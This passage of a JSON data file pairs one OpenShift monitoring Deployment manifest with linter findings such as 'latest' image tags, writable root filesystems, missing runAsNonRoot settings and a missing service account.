    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: openshift-state-metrics\n  name: openshift-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: openshift-state-metrics\n  template:\n    metadata:\n      labels:\n        k8s-app: openshift-state-metrics\n    spec:\n      containers:\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        image: quay.io/openshift/origin-openshift-state-metrics:latest\n        name: openshift-state-metrics\n        resources:\n          requests:\n            cpu: 1m\n            memory: 150Mi\n      serviceAccountName: openshift-state-metrics\n      volumes:\n      - name: openshift-state-metrics-tls\n        secret:\n          secretName: openshift-state-metrics-tls\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"kube-rbac-proxy-main\" is using an invalid container image, \"quay.io/openshift/origin-kube-rbac-proxy:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3139",
    "manifest_path": "data/manifests/the_stack_sample/sample_0934.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: openshift-state-metrics\n  name: openshift-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: openshift-state-metrics\n  template:\n    metadata:\n      labels:\n        k8s-app: openshift-state-metrics\n    spec:\n      containers:\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        image: quay.io/openshift/origin-openshift-state-metrics:latest\n        name: openshift-state-metrics\n        resources:\n          requests:\n            cpu: 1m\n            memory: 150Mi\n      serviceAccountName: openshift-state-metrics\n      volumes:\n      - name: openshift-state-metrics-tls\n        secret:\n          secretName: openshift-state-metrics-tls\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"kube-rbac-proxy-self\" is using an invalid container image, \"quay.io/openshift/origin-kube-rbac-proxy:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3140",
    "manifest_path": "data/manifests/the_stack_sample/sample_0934.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: openshift-state-metrics\n  name: openshift-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: openshift-state-metrics\n  template:\n    metadata:\n      labels:\n        k8s-app: openshift-state-metrics\n    spec:\n      containers:\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        image: quay.io/openshift/origin-openshift-state-metrics:latest\n        name: openshift-state-metrics\n        resources:\n          requests:\n            cpu: 1m\n            memory: 150Mi\n      serviceAccountName: openshift-state-metrics\n      volumes:\n      - name: openshift-state-metrics-tls\n        secret:\n          secretName: openshift-state-metrics-tls\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"openshift-state-metrics\" is using an invalid container image, \"quay.io/openshift/origin-openshift-state-metrics:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3141",
    "manifest_path": "data/manifests/the_stack_sample/sample_0934.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: openshift-state-metrics\n  name: openshift-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: openshift-state-metrics\n  template:\n    metadata:\n      labels:\n        k8s-app: openshift-state-metrics\n    spec:\n      containers:\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        image: quay.io/openshift/origin-openshift-state-metrics:latest\n        name: openshift-state-metrics\n        resources:\n          requests:\n            cpu: 1m\n            memory: 150Mi\n      serviceAccountName: openshift-state-metrics\n      volumes:\n      - name: openshift-state-metrics-tls\n        secret:\n          secretName: openshift-state-metrics-tls\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-rbac-proxy-main\" does not have a read-only root file system"
  },
  {
    "id": "3142",
    "manifest_path": "data/manifests/the_stack_sample/sample_0934.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: openshift-state-metrics\n  name: openshift-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: openshift-state-metrics\n  template:\n    metadata:\n      labels:\n        k8s-app: openshift-state-metrics\n    spec:\n      containers:\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        image: quay.io/openshift/origin-openshift-state-metrics:latest\n        name: openshift-state-metrics\n        resources:\n          requests:\n            cpu: 1m\n            memory: 150Mi\n      serviceAccountName: openshift-state-metrics\n      volumes:\n      - name: openshift-state-metrics-tls\n        secret:\n          secretName: openshift-state-metrics-tls\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-rbac-proxy-self\" does not have a read-only root file system"
  },
  {
    "id": "3143",
    "manifest_path": "data/manifests/the_stack_sample/sample_0934.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: openshift-state-metrics\n  name: openshift-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: openshift-state-metrics\n  template:\n    metadata:\n      labels:\n        k8s-app: openshift-state-metrics\n    spec:\n      containers:\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        image: quay.io/openshift/origin-openshift-state-metrics:latest\n        name: openshift-state-metrics\n        resources:\n          requests:\n            cpu: 1m\n            memory: 150Mi\n      serviceAccountName: openshift-state-metrics\n      volumes:\n      - name: openshift-state-metrics-tls\n        secret:\n          secretName: openshift-state-metrics-tls\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"openshift-state-metrics\" does not have a read-only root file system"
  },
  {
    "id": "3144",
    "manifest_path": "data/manifests/the_stack_sample/sample_0934.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: openshift-state-metrics\n  name: openshift-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: openshift-state-metrics\n  template:\n    metadata:\n      labels:\n        k8s-app: openshift-state-metrics\n    spec:\n      containers:\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        image: quay.io/openshift/origin-openshift-state-metrics:latest\n        name: openshift-state-metrics\n        resources:\n          requests:\n            cpu: 1m\n            memory: 150Mi\n      serviceAccountName: openshift-state-metrics\n      volumes:\n      - name: openshift-state-metrics-tls\n        secret:\n          secretName: openshift-state-metrics-tls\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"openshift-state-metrics\" not found"
  },
  {
    "id": "3145",
    "manifest_path": "data/manifests/the_stack_sample/sample_0934.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: openshift-state-metrics\n  name: openshift-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: openshift-state-metrics\n  template:\n    metadata:\n      labels:\n        k8s-app: openshift-state-metrics\n    spec:\n      containers:\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        image: quay.io/openshift/origin-openshift-state-metrics:latest\n        name: openshift-state-metrics\n        resources:\n          requests:\n            cpu: 1m\n            memory: 150Mi\n      serviceAccountName: openshift-state-metrics\n      volumes:\n      - name: openshift-state-metrics-tls\n        secret:\n          secretName: openshift-state-metrics-tls\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-rbac-proxy-main\" is not set to runAsNonRoot"
  },
  {
    "id": "3146",
    "manifest_path": "data/manifests/the_stack_sample/sample_0934.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: openshift-state-metrics\n  name: openshift-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: openshift-state-metrics\n  template:\n    metadata:\n      labels:\n        k8s-app: openshift-state-metrics\n    spec:\n      containers:\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        image: quay.io/openshift/origin-openshift-state-metrics:latest\n        name: openshift-state-metrics\n        resources:\n          requests:\n            cpu: 1m\n            memory: 150Mi\n      serviceAccountName: openshift-state-metrics\n      volumes:\n      - name: openshift-state-metrics-tls\n        secret:\n          secretName: openshift-state-metrics-tls\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-rbac-proxy-self\" is not set to runAsNonRoot"
  },
  {
    "id": "3147",
    "manifest_path": "data/manifests/the_stack_sample/sample_0934.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: openshift-state-metrics\n  name: openshift-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: openshift-state-metrics\n  template:\n    metadata:\n      labels:\n        k8s-app: openshift-state-metrics\n    spec:\n      containers:\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        image: quay.io/openshift/origin-openshift-state-metrics:latest\n        name: openshift-state-metrics\n        resources:\n          requests:\n            cpu: 1m\n            memory: 150Mi\n      serviceAccountName: openshift-state-metrics\n      volumes:\n      - name: openshift-state-metrics-tls\n        secret:\n          secretName: openshift-state-metrics-tls\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"openshift-state-metrics\" is not set to runAsNonRoot"
  },
  {
    "id": "3148",
    "manifest_path": "data/manifests/the_stack_sample/sample_0934.yaml",
